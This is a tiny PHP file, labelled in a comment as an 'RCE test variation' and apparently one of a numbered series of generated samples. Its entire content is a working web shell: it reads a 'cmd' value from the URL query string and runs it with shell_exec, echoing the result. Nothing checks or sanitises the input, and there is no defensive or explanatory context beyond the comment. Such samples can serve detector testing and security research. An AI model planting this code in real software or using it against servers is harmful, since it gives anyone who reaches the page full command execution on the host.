<?php
// RCE test variation #1320
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>